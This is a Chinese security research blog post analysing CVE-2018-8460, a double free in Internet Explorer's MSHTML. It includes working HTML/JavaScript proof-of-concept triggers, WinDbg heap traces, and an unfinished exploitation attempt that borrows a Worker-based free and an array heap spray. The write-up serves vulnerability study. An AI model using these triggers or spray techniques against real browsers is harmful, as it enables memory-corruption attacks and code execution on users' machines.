@@ -1,0 +1,749 @@
+I"$�<h1 id="前言">前言</h1>
+
+<p>分析该漏洞的原因是看到ZDI的这篇分析文章：<a href="https://www.thezdi.com/blog/2018/10/18/cve-2018-8460-exposing-a-double-free-in-internet-explorer-for-code-execution">CVE-2018-8460: EXPOSING A DOUBLE FREE IN INTERNET EXPLORER FOR CODE EXECUTION</a>。里面详细分析了该漏洞的原理和利用思路，但是没有EXP，因此想尝试自己写出EXP。虽然最终没有成功写出EXP，但还是把学习的过程记录了下来，作为一个积累。<!--more--></p>
+
+<h1 id="漏洞成因">漏洞成因</h1>
+
+<p>poc如下：</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;html&gt;</span>
+<span class="nt">&lt;head&gt;</span>
+        <span class="nt">&lt;meta</span> <span class="na">http-equiv=</span><span class="s">"Expires"</span> <span class="na">content=</span><span class="s">"-1"</span><span class="nt">&gt;</span>
+<span class="nt">&lt;head&gt;</span>
+<span class="nt">&lt;script&gt;</span>
+	
+<span class="kd">var</span> <span class="nx">iterationCount</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+	
+<span class="kd">function</span> <span class="nx">testcase</span><span class="p">()</span> <span class="p">{</span>
+<span class="nx">elm</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="dl">'</span><span class="s1">ins</span><span class="dl">'</span><span class="p">)</span>
+<span class="nx">func</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nx">iterationCount</span><span class="o">++</span><span class="p">;</span>
+        <span class="k">switch</span> <span class="p">(</span><span class="nx">iterationCount</span><span class="p">)</span> <span class="p">{</span>
+                <span class="k">case</span> <span class="mi">1</span><span class="p">:</span>
+                <span class="k">case</span> <span class="mi">2</span><span class="p">:</span>
+                <span class="k">case</span> <span class="mi">12</span><span class="p">:</span>
+                <span class="k">case</span> <span class="mi">22</span><span class="p">:</span>
+                <span class="cm">/*case 34:*/</span>
+                        <span class="k">this</span><span class="p">.</span><span class="nx">style</span><span class="p">.</span><span class="nx">cssText</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">-ms-layout-grid: char strict auto auto; -ms-layout-grid: none fixed 49cp auto;</span><span class="dl">'</span><span class="p">;</span>
+                        <span class="k">break</span><span class="p">;</span>
+        <span class="p">}</span>
+<span class="p">}</span>
+<span class="nx">elm</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="dl">'</span><span class="s1">DOMAttrModified</span><span class="dl">'</span><span class="p">,</span> <span class="nx">func</span><span class="p">,</span> <span class="kc">true</span><span class="p">)</span>
+<span class="nx">elm</span><span class="p">.</span><span class="nx">className</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">AAAAAAAAA</span><span class="dl">'</span>
+
+<span class="nx">location</span><span class="p">.</span><span class="nx">reload</span><span class="p">();</span>
+
+<span class="p">}</span>
+<span class="nt">&lt;/script&gt;</span>
+
+<span class="nt">&lt;body</span> <span class="na">onload=</span><span class="s">'testcase();'</span><span class="nt">&gt;</span>
+<span class="nt">&lt;/html&gt;</span>
+</code></pre></div></div>
+
+<p>下断<code class="language-plaintext highlighter-rouge">MSHTML!CWritableCSSStyleDeclaration::put_cssText</code>，查看添加cssText后的结构：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0:007&gt; r
+eax=6bd3e8b4 ebx=03056320 ecx=6bfb5de0 edx=00000000 esi=6bfb5de0 edi=0413a7e0
+eip=6bfb5de0 esp=0413a7d4 ebp=0413a7f8 iopl=0         nv up ei pl zr na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
+MSHTML!CWritableCSSStyleDeclaration::put_cssText:
+6bfb5de0 8bff            mov     edi,edi
+0:007&gt; dps poi(esp+4) L7					//还未执行put_cssText，Style中为空
+03cbe9c0  6bd3e8b4 MSHTML!CMSStyle::`vftable'
+03cbe9c4  00000001
+03cbe9c8  00000000
+03cbe9cc  00000008
+03cbe9d0  03c0cc00
+03cbe9d4  00000000
+03cbe9d8  0446aab0
+0:007&gt; dd 03c0cc00 L8
+03c0cc00  00000000 00000000 00000000 00000008
+03c0cc10  00000000 00000000 00000000 00000000
+0:007&gt; g
+Breakpoint 0 hit
+eax=6bd3e8b4 ebx=03056320 ecx=6bfb5de0 edx=00000000 esi=6bfb5de0 edi=04139738
+eip=6bfb5de0 esp=0413972c ebp=04139750 iopl=0         nv up ei pl zr na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
+MSHTML!CWritableCSSStyleDeclaration::put_cssText:
+6bfb5de0 8bff            mov     edi,edi
+0:007&gt; dd 03c0cc00 L8						//第一次执行完后，Style中含有1个元素
+03c0cc00  00000010 00000001 03cbea00 00114098
+03c0cc10  00000000 00000000 00000000 00000000
+0:007&gt; dd 03cbea00 L4
+03cbea00  04090300 6be25b4c 00000001 0446b960
+0:007&gt; g
+Breakpoint 0 hit
+eax=6bd3e8b4 ebx=03056320 ecx=6bfb5de0 edx=00000000 esi=6bfb5de0 edi=04139738
+eip=6bfb5de0 esp=0413972c ebp=04139750 iopl=0         nv up ei pl zr na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
+MSHTML!CWritableCSSStyleDeclaration::put_cssText:
+6bfb5de0 8bff            mov     edi,edi
+0:007&gt; dd 03c0cc00 L8						//第二次执行完后，Style中含有11个元素
+03c0cc00  00000034 0000000b 03cb4f70 0102c878
+03c0cc10  04d501e0 00000002 00000000 00000000
+0:007&gt; dd 03cb4f70 Lb*4
+03cb4f70  04091400 6be39068 00000001 0000000f
+03cb4f80  0409140a 6be39068 00000001 0000000f
+03cb4f90  04091400 6be39140 00000001 0000000f
+03cb4fa0  0409140a 6be39140 00000001 0000000f
+03cb4fb0  04090300 6be25b4c 00000004 005700e4
+03cb4fc0  0409030a 6be25b4c 00000001 6bd8aca8
+03cb4fd0  04090300 6be25c58 00000002 03020c04
+03cb4fe0  0409030a 6be25c58 00000002 00000000
+03cb4ff0  84081f0a 8001140b 04d5cc68 04d5cc68
+03cb5000  808c1f0a 8001140b 04d5cd10 00000006
+03cb5010  84081f0a 8001140b 04d5cca0 04d5ccca
+0:007&gt; du 04d5cc68 							//输入的cssText
+04d5cc68  "char strict auto auto"
+0:007&gt; du 04d5cd10 
+04d5cd10  "none fixed 49cp auto"
+0:007&gt; du 04d5cca0 
+04d5cca0  "char strict auto auto"
+0:007&gt; g
+Breakpoint 0 hit
+eax=6bd3e8b4 ebx=03056320 ecx=6bfb5de0 edx=00000000 esi=6bfb5de0 edi=04139738
+eip=6bfb5de0 esp=0413972c ebp=04139750 iopl=0         nv up ei pl zr na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
+MSHTML!CWritableCSSStyleDeclaration::put_cssText:
+6bfb5de0 8bff            mov     edi,edi
+0:007&gt; dd 03c0cc00 L8						//第三次执行完，Style中含有7个元素
+03c0cc00  00000024 00000007 03cbce10 00bdc648
+03c0cc10  04d501e0 00000002 00000000 00000000
+0:007&gt; dd 03cbce10 L7*4
+03cbce10  04091400 6be39068 00000001 0000000f
+03cbce20  04091400 6be39140 00000001 0000000f
+03cbce30  04090300 6be25b4c 00000001 6ce7d8e4
+03cbce40  04090300 6be25c58 00000003 03020c04
+03cbce50  0409030a 6be25c58 00000002 00000000
+03cbce60  808c1f0a 8001140b 04d5cc68 6ce7d988
+03cbce70  84081f0a 8001140b 04d5cca0 04d5ccca
+0:007&gt; du 04d5cc68 							//cssText
+04d5cc68  "none fixed 49cp auto"
+0:007&gt; du 04d5cca0 
+04d5cca0  "char strict auto auto"
+0:007&gt; g
+Breakpoint 1 hit
+eax=04139704 ebx=1f9d2224 ecx=03c0cc00 edx=04139494 esi=800113eb edi=00000000
+eip=6bd64cb8 esp=041394e4 ebp=04139654 iopl=0         nv up ei pl nz na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000206
+MSHTML!CAttrArray::Free:
+6bd64cb8 8bff            mov     edi,edi
+0:007&gt; g
+Breakpoint 1 hit
+eax=03bf8000 ebx=00000006 ecx=03c0cc00 edx=00000000 esi=04139704 edi=03c0c160
+eip=6bd64cb8 esp=0413948c ebp=041394d8 iopl=0         nv up ei pl nz na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000206
+MSHTML!CAttrArray::Free:
+6bd64cb8 8bff            mov     edi,edi
+0:007&gt; g
+Breakpoint 1 hit
+eax=00000000 ebx=03cb83e0 ecx=03cb83e0 edx=00000005 esi=03cb83e0 edi=ffffffff
+eip=6bd64cb8 esp=0413c1e4 ebp=0413c1f4 iopl=0         nv up ei pl nz na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000206
+MSHTML!CAttrArray::Free:
+6bd64cb8 8bff            mov     edi,edi
+0:007&gt; dd 03c0cc00 L8						//经过第四次put_cssText后，Style中含有10个元素
+03c0cc00  00000034 0000000a 03cb5040 00e04748
+03c0cc10  04d501e0 00000002 00000000 00000000
+0:007&gt; dd 03cb5040 La*4
+03cb5040  04091400 6be39068 00000002 0000000f
+03cb5050  0409140a 6be39068 00000001 0000000f
+03cb5060  04091400 6be39140 00000002 0000000f
+03cb5070  0409140a 6be39140 00000001 0000000f
+03cb5080  04090300 6be25b4c 00000001 6ce7d8e4
+03cb5090  04090300 6be25c58 00000002 03020c04
+03cb50a0  808c1f0a 8001140b 04d5cc68 00000006
+03cb50b0  808c1f0a 8001140b 04d5cd10 6ce7d988
+03cb50c0  84081f0a 8001140b 04d5cca0 04d5ccca	//第9个和第10个元素指向同一个字符串
+03cb50d0  84081f0a 8001140b 04d5cca0 04d5ccca
+0:007&gt; du 04d5cc68 
+04d5cc68  "none fixed 49cp auto"
+0:007&gt; du 04d5cd10 
+04d5cd10  "none fixed 49cp auto"
+0:007&gt; du 04d5cca0 
+04d5cca0  "char strict auto auto"
+0:007&gt; du 04d5cca0 
+04d5cca0  "char strict auto auto"
+</code></pre></div></div>
+
+<p>经过四次put_cssText后，Style中含有两个指向相同cssText的元素，在后续执行<code class="language-plaintext highlighter-rouge">location.reload();</code>时，会清理当前文档的所有元素，此时<code class="language-plaintext highlighter-rouge">CAttrArray::Free</code>准备释放的就是elm对象:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0:008&gt; g
+Breakpoint 1 hit
+eax=0020fd78 ebx=02f355b0 ecx=02f1db70 edx=00f22e01 esi=02f1db70 edi=02f355c0
+eip=6d1d4cb8 esp=035dc0ec ebp=035dc0fc iopl=0         nv up ei pl nz na po nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202
+MSHTML!CAttrArray::Free:
+6d1d4cb8 8bff            mov     edi,edi
+0:008&gt; dps poi(esp+4) L10						//当前释放的AttrArray就是elm
+02f37b80  6d2e1e34 MSHTML!CPhraseElement::`vftable'
+02f37b84  00008000
+02f37b88  00000000
+02f37b8c  00000011
+02f37b90  02f1db70
+02f37b94  00000000
+02f37b98  00000000
+02f37b9c  00000000
+02f37ba0  0000003f
+02f37ba4  02000400
+02f37ba8  80020e00
+02f37bac  00020044
+02f37bb0  02f328a0
+02f37bb4  00000000
+02f37bb8  00000000
+02f37bbc  00000000
+0:008&gt; dd 02f1db70 L4
+02f1db70  00000018 00000005 02f35560 0041faf0	//AttrArray
+0:008&gt; dd 02f35560 L5*4							
+02f35560  80001f00 800103e9 04274ab0 035db400	//className = 'AAAAAAAAA'
+02f35570  80000d09 800103e9 02f35620 02f35620	//Attribute:class
+02f35580  80000d09 800103eb 02f355c0 02f355c0	//Attribute:style
+02f35590  80008005 800113f2 05b223e0 ee3dfb3f	//style.cssText
+02f355a0  80001a04 800113f3 02f377c0 02f37800
+0:008&gt; du 04274ab0 
+04274ab0  "AAAAAAAAA"
+0:008&gt; du poi(02f35620+24)
+0426a13c  "class"
+0:008&gt; du poi(02f355c0+24)
+0426a19c  "style"
+0:008&gt; dd 05b223e0 L4
+05b223e0  00000034 0000000a 02f7bd40 00e04748
+0:008&gt; dd 02f7bd40 La*4
+02f7bd40  04091400 6d2a9068 00000002 0000000f
+02f7bd50  0409140a 6d2a9068 00000001 0000000f
+02f7bd60  04091400 6d2a9140 00000002 0000000f
+02f7bd70  0409140a 6d2a9140 00000001 0000000f
+02f7bd80  04090300 6d295b4c 00000001 6e2ed8e4
+02f7bd90  04090300 6d295c58 00000002 00ef0c04
+02f7bda0  808c1f0a 8001140b 04284340 00000006
+02f7bdb0  808c1f0a 8001140b 04284458 6e2ed988
+02f7bdc0  84081f0a 8001140b 042843e8 04284412	//重复的字符串
+02f7bdd0  84081f0a 8001140b 042843e8 04284412
+</code></pre></div></div>
+
+<p>随后<code class="language-plaintext highlighter-rouge">CAttrArray::Free</code>内部会执行memmove移动AttrArray，并执行<code class="language-plaintext highlighter-rouge">ProcessHeapFree</code>释放各个结构：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0:008&gt; pc
+eax=02f35570 ebx=02f1db70 ecx=02f35560 edx=00f22e01 esi=02f35570 edi=035dc0e8
+eip=6d7fcc91 esp=035dc0bc ebp=035dc0e8 iopl=0         nv up ei pl nz na po nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202
+MSHTML!CAttrArray::Free+0x84:
+6d7fcc91 ff15d4b1406e    call    dword ptr [MSHTML!_imp__memmove (6e40b1d4)] ds:002b:6e40b1d4={msvcrt!memmove (75a49e5a)}
+0:008&gt; dd 02f35560 L5*4
+02f35560  80001f00 800103e9 04274ab0 035db400	//className = 'AAAAAAAAA'
+02f35570  80000d09 800103e9 02f35620 02f35620	//Attribute:class
+02f35580  80000d09 800103eb 02f355c0 02f355c0	//Attribute:style
+02f35590  80008005 800113f2 05b223e0 ee3dfb3f	//style.cssText
+02f355a0  80001a04 800113f3 02f377c0 02f37800
+0:008&gt; pc
+eax=0000001f ebx=02f1db70 ecx=04274ab0 edx=00000000 esi=02f35570 edi=035dc0e8
+eip=6d221ae4 esp=035dc0c8 ebp=035dc0e8 iopl=0         nv up ei pl zr na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
+MSHTML!CAttrArray::Free+0xfd:
+6d221ae4 e8ddb4f8ff      call    MSHTML!ProcessHeapFree (6d1acfc6)
+0:008&gt; dd 02f35560 L5*4
+02f35560  80000d09 800103e9 02f35620 02f35620	//Attribute:class
+02f35570  80000d09 800103eb 02f355c0 02f355c0	//Attribute:style
+02f35580  80008005 800113f2 05b223e0 ee3dfb3f	//style.cssText
+02f35590  80001a04 800113f3 02f377c0 02f37800
+02f355a0  80001a04 800113f3 02f377c0 02f37800
+0:008&gt; dps poi(esp) La							//要释放Attribute:style
+02f355c0  6d1877a4 MSHTML!CAttribute::`vftable'
+02f355c4  00000001
+02f355c8  00000000
+02f355cc  00000008
+02f355d0  00000000
+02f355d4  00000000
+02f355d8  00000000
+02f355dc  00000000
+02f355e0  ffffffff
+02f355e4  0426a19c
+</code></pre></div></div>
+
+<p>当外层的elm都释放完毕后，开始释放内部的elm.style.cssText：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0:008&gt; pc
+eax=00000000 ebx=02f1db70 ecx=05b223e0 edx=00000000 esi=05b223e0 edi=035dc0e8
+eip=6d221aff esp=035dc0b0 ebp=035dc0bc iopl=0         nv up ei pl nz na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000206
+MSHTML!CAttrArray::`scalar deleting destructor'+0xc:
+6d221aff e8b431fbff      call    MSHTML!CAttrArray::Free (6d1d4cb8)
+0:008&gt; dd 02f35560 L5*4								//此时外部的elm全部被释放
+02f35560  80001a04 800113f3 02f377c0 02f37800
+02f35570  80001a04 800113f3 02f377c0 02f37800
+02f35580  80001a04 800113f3 02f377c0 02f37800
+02f35590  80001a04 800113f3 02f377c0 02f37800
+02f355a0  80001a04 800113f3 02f377c0 02f37800
+0:008&gt; dd 05b223e0 L4								//还未被释放的elm.style.cssText
+05b223e0  00000034 00000009 02f7bd40 00000008		
+0:008&gt; dd 02f7bd40 La*4
+02f7bd40  04091400 6d2a9068 00000002 0000000f
+02f7bd50  0409140a 6d2a9068 00000001 0000000f
+02f7bd60  04091400 6d2a9140 00000002 0000000f
+02f7bd70  0409140a 6d2a9140 00000001 0000000f
+02f7bd80  04090300 6d295b4c 00000001 6e2ed8e4
+02f7bd90  04090300 6d295c58 00000002 00ef0c04
+02f7bda0  808c1f0a 8001140b 04284340 00000006
+02f7bdb0  808c1f0a 8001140b 04284458 6e2ed988
+02f7bdc0  84081f0a 8001140b 042843e8 04284412
+02f7bdd0  84081f0a 8001140b 042843e8 04284412
+0:008&gt; 
+eax=0000001f ebx=05b223e0 ecx=04284340 edx=00000000 esi=02f7bd50 edi=035dc0a8
+eip=6d221ae4 esp=035dc088 ebp=035dc0a8 iopl=0         nv up ei pl zr na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
+MSHTML!CAttrArray::Free+0xfd:
+6d221ae4 e8ddb4f8ff      call    MSHTML!ProcessHeapFree (6d1acfc6)
+0:008&gt; dd 02f7bd40 La*4								//执行许多memmove后，开始释放cssText内部的字符串
+02f7bd40  808c1f0a 8001140b 04284458 6e2ed988
+02f7bd50  84081f0a 8001140b 042843e8 04284412
+02f7bd60  84081f0a 8001140b 042843e8 04284412
+02f7bd70  84081f0a 8001140b 042843e8 04284412
+02f7bd80  84081f0a 8001140b 042843e8 04284412
+02f7bd90  84081f0a 8001140b 042843e8 04284412
+02f7bda0  84081f0a 8001140b 042843e8 04284412
+02f7bdb0  84081f0a 8001140b 042843e8 04284412
+02f7bdc0  84081f0a 8001140b 042843e8 04284412
+02f7bdd0  84081f0a 8001140b 042843e8 04284412
+</code></pre></div></div>
+
+<p>此时可以清晰的看到，由于之前cssText中存在两个指向相同字符串的元素，因此在释放时会将同一个字符串释放两次，触发了漏洞：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0:008&gt; t
+eax=0000001f ebx=05b223e0 ecx=04284340 edx=00000000 esi=02f7bd50 edi=035dc0a8
+eip=6d1acfc6 esp=035dc084 ebp=035dc0a8 iopl=0         nv up ei pl zr na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
+MSHTML!ProcessHeapFree:
+6d1acfc6 8bff            mov     edi,edi
+0:008&gt; pc
+eax=0000001f ebx=05b223e0 ecx=003f0000 edx=04284340 esi=02f7bd50 edi=035dc0a8
+eip=6d1acfd1 esp=035dc080 ebp=035dc0a8 iopl=0         nv up ei pl zr na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
+MSHTML!ProcessHeapFree+0xb:
+6d1acfd1 e8b4558e00      call    MSHTML!MemoryProtection::HeapFree (6da9258a)
+0:008&gt; du poi(esp)								//准备释放第一个cssText
+04284340  "none fixed 49cp auto"
+0:008&gt; pc
+eax=0000001f ebx=05b223e0 ecx=003f0000 edx=04284458 esi=02f7bd50 edi=035dc0a8
+eip=6d1acfd1 esp=035dc080 ebp=035dc0a8 iopl=0         nv up ei pl zr na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
+MSHTML!ProcessHeapFree+0xb:
+6d1acfd1 e8b4558e00      call    MSHTML!MemoryProtection::HeapFree (6da9258a)
+0:008&gt; du 04284340								//第一个cssText被释放
+04284340  "Æone fixed 49cp auto"
+0:008&gt; du poi(esp) 								//准备释放第二个cssText
+04284458  "none fixed 49cp auto"
+0:008&gt; pc
+eax=0000001f ebx=05b223e0 ecx=003f0000 edx=042843e8 esi=02f7bd50 edi=035dc0a8
+eip=6d1acfd1 esp=035dc080 ebp=035dc0a8 iopl=0         nv up ei pl zr na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
+MSHTML!ProcessHeapFree+0xb:
+6d1acfd1 e8b4558e00      call    MSHTML!MemoryProtection::HeapFree (6da9258a)
+0:008&gt; du 04284458								//第二个cssText被释放
+04284458  ".one fixed 49cp auto"				
+0:008&gt; du poi(esp)								//准备释放第三个cssText
+042843e8  "char strict auto auto"
+0:008&gt; pc
+eax=0000001f ebx=05b223e0 ecx=003f0000 edx=042843e8 esi=02f7bd50 edi=035dc0a8
+eip=6d1acfd1 esp=035dc080 ebp=035dc0a8 iopl=0         nv up ei pl zr na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
+MSHTML!ProcessHeapFree+0xb:
+6d1acfd1 e8b4558e00      call    MSHTML!MemoryProtection::HeapFree (6da9258a)
+0:008&gt; du 042843e8								//此时第三个cssText已经被释放
+042843e8  ".溜"
+0:008&gt; du poi(esp)								//但是继续释放同一个内存，此时继续则会触发双重释放
+042843e8  ".溜"
+</code></pre></div></div>
+
+<h1 id="漏洞利用">漏洞利用</h1>
+
+<h2 id="简化poc">简化POC</h2>
+
+<p>经过最终简化后的POC为：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;html&gt;
+&lt;head&gt;
+        &lt;meta http-equiv="Expires" content="-1"&gt;
+&lt;head&gt;
+&lt;script&gt;
+	
+function testcase() {
+elm = document.createElement('ins')
+func = function(e) {
+    this.style.cssText = '-ms-layout-grid: char strict auto auto; -ms-layout-grid: none fixed 49cp auto;';
+}
+elm.addEventListener('DOMAttrModified', func, true)
+elm.className = 'AAAAAAAAA'
+
+}
+&lt;/script&gt;
+
+&lt;body onload='testcase();'&gt;
+&lt;/html&gt;
+</code></pre></div></div>
+
+<p>然而该POC的利用难度更大，虽然不用reload即可造成崩溃，但是调试后发现崩溃原因是因为每次设置cssText后都会触发EventListener使得继续设置cssText，嵌套调用多次后导致释放原来的cssText出错，造成了内存损坏：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0:007&gt; r
+eax=00000000 ebx=00000000 ecx=77342c0e edx=03944201 esi=00380000 edi=07d408f8
+eip=7739e975 esp=03944454 ebp=039444cc iopl=0         nv up ei pl nz na po nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202
+ntdll!RtlReportCriticalFailure+0x29:
+7739e975 cc              int     3
+0:007&gt; kb
+ # ChildEBP RetAddr  Args to Child              
+00 039444cc 7739f8a9 c0000374 773d4270 03944510 ntdll!RtlReportCriticalFailure+0x29
+01 039444dc 7739f989 00000002 7d9ede58 00000000 ntdll!RtlpReportHeapFailure+0x21
+02 03944510 7734d95c 00000008 00380000 07d408f8 ntdll!RtlpLogHeapFailure+0xa1
+03 03944540 764914ad 00380000 00000000 07d40900 ntdll!RtlFreeHeap+0x64
+04 03944554 6da925cc 00380000 00000000 07d40900 kernel32!HeapFree+0x14
+05 03944570 6d1acfd6 07d40900 6d221ae9 00000000 MSHTML!MemoryProtection::HeapFree+0x46
+06 03944578 6d221ae9 00000000 800113eb 1f9d2224 MSHTML!ProcessHeapFree+0x10
+07 039445a0 6d425d0a 033e7680 00000000 033e7a40 MSHTML!CAttrArray::Free+0x102
+08 03944714 6d607f06 6d2a4e1c 1f9d2224 07d5855c MSHTML!PROPERTYDESC::HandleStyleComponentProperty+0x8ac
+09 03944778 6d607df1 07d5855c 033e7a40 039447c4 MSHTML!BASICPROPPARAMS::SetStyleComponentProperty+0xfe
+0a 039447a4 6d607d82 6d2a4e1c 039447c4 000d2200 MSHTML!CBase::put_StyleComponentHelper+0x3a
+0b 039447c8 6d8d2aac 033e7a40 07d5855c 6d2a4e1c MSHTML!CCSSStyleDeclaration::put_StyleComponentLocalHelper+0x7a
+0c 039447e8 6d8d2a76 033e7a40 07d5855c 03944890 MSHTML!CWritableCSSStyleDeclaration::put_cssText+0x28
+0d 03944810 706d302a 041f7b10 02000002 041eaa80 MSHTML!CFastDOM::CCSSStyleDeclaration::Trampoline_Set_cssText+0x7f
+0e 03944880 706d3a73 041f7b10 02000002 041eaa80 jscript9!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x19d
+0f 039448a8 70840b88 d6d1a38e 03944b60 041dd360 jscript9!&lt;lambda_73b9149c3f1de98aaab9368b6ff2ae9d&gt;::operator()+0xa1
+10 03944920 02d90125 034d3028 041eaa80 000003b7 jscript9!Js::JavascriptOperators::PatchPutValueNoLocalFastPath&lt;Js::InlineCache&gt;+0x352
+</code></pre></div></div>
+
+<p>内存释放的动作不可控，无法在释放内存前添加对象占用内存，因此仍使用原POC进行利用。</p>
+
+<h2 id="利用尝试">利用尝试</h2>
+
+<h3 id="尝试一手动释放csstext">尝试一：手动释放cssText</h3>
+
+<p>在查看CVE-2020-17053时，可以通过Worker对象释放ArrayBuffer，随后通过新建数组对象填充被释放的内存实现UAF：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>var ab = new ArrayBuffer(0x8c);
+var obj = {};
+obj.valueOf = function () {
+    if (flag == 1) {
+		//alert("free");
+        worker = new Worker('worker.js');
+        worker.postMessage(ab, [ab]);
+        worker.terminate();
+        worker = null;
+        var start = Date.now();
+        while (Date.now() - start &lt; 200) {}
+        for(var i=0;i&lt;0x1000;++i)
+		{
+			R1[i] = new Array((0x1000-0x20)/4);
+			for(var j=0;j&lt;R1[i].length;++j)
+			{
+				R1[i][j] = 0x666;   //flag
+			}
+		}
+		// TODO: reclaim freed memory
+		return 0;
+    }
+</code></pre></div></div>
+
+<p>于是打算在利用Worker对象释放cssText随后占用，修改EXP如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;html&gt;
+&lt;head&gt;
+        &lt;meta http-equiv="Expires" content="-1"&gt;
+&lt;head&gt;
+&lt;script&gt;
+	
+var iterationCount = 0;
+	
+function testcase() {
+Math.atan2(1,0);
+elm = document.createElement('ins')
+func = function(e) {
+        iterationCount++;
+        switch (iterationCount) {
+                case 1:
+                case 2:
+                case 12:
+                case 22:
+                /*case 34:*/
+                        this.style.cssText = '-ms-layout-grid: char strict auto auto; -ms-layout-grid: none fixed 49cp auto;';
+                        break;
+        }
+}
+elm.addEventListener('DOMAttrModified', func, true)
+elm.className = 'AAAAAAAAA'
+
+elm.removeEventListener('DOMAttrModified', func, true);
+worker = new Worker('worker.js');
+worker.postMessage(elm.style.cssText);
+worker.terminate();
+var arr = new ArrayBuffer(0x22);
+
+}
+&lt;/script&gt;
+
+&lt;body onload='testcase();'&gt;
+&lt;/html&gt;
+</code></pre></div></div>
+
+<p>然而在调试时发现<code class="language-plaintext highlighter-rouge">worker.terminate();</code>执行后，cssText字符串并没有被释放，也就无法占用内存利用：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0:007&gt; g
+Breakpoint 0 hit
+eax=00000002 ebx=04de1a50 ecx=6a854520 edx=040ab4d0 esi=00000002 edi=040ab540
+eip=6e1b3027 esp=040ab4c8 ebp=040ab530 iopl=0         nv up ei pl zr na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
+jscript9!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x19a:
+6e1b3027 ff55e8          call    dword ptr [ebp-18h]  ss:002b:040ab518={MSHTML!CFastDOM::CWorker::Trampoline_postMessage (6a854520)}
+0:007&gt; g
+Breakpoint 0 hit
+eax=00000001 ebx=04de1a80 ecx=6b07b4c0 edx=040ab4d8 esi=00000001 edi=040ab548
+eip=6e1b3027 esp=040ab4d0 ebp=040ab538 iopl=0         nv up ei pl zr na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
+jscript9!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x19a:
+6e1b3027 ff55e8          call    dword ptr [ebp-18h]  ss:002b:040ab520={MSHTML!CFastDOM::CWorker::Trampoline_terminate (6b07b4c0)}
+0:007&gt; dd 03adb930 La*4
+03adb930  04091400 6a3b9068 00000002 0000000f
+03adb940  0409140a 6a3b9068 00000001 0000000f
+03adb950  04091400 6a3b9140 00000002 0000000f
+03adb960  0409140a 6a3b9140 00000001 0000000f
+03adb970  04090300 6a3a5b4c 00000001 6b3fd8e4
+03adb980  04090300 6a3a5c58 00000002 03080c04
+03adb990  808c1f0a 8001140b 043cc748 00000006
+03adb9a0  808c1f0a 8001140b 043cc7f0 6b3fd988
+03adb9b0  84081f0a 8001140b 043cc780 043cc7aa
+03adb9c0  84081f0a 8001140b 043cc780 043cc7aa
+0:007&gt; g
+Breakpoint 0 hit
+eax=00000002 ebx=04db3360 ecx=6b062d40 edx=040ab4d0 esi=00000002 edi=040ab540
+eip=6e1b3027 esp=040ab4c8 ebp=040ab530 iopl=0         nv up ei pl zr na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
+jscript9!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x19a:
+6e1b3027 ff55e8          call    dword ptr [ebp-18h]  ss:002b:040ab518={MSHTML!CFastDOM::CWindow::Trampoline_alert (6b062d40)}
+0:007&gt; dd 03adb930 La*4
+03adb930  04091400 6a3b9068 00000002 0000000f
+03adb940  0409140a 6a3b9068 00000001 0000000f
+03adb950  04091400 6a3b9140 00000002 0000000f
+03adb960  0409140a 6a3b9140 00000001 0000000f
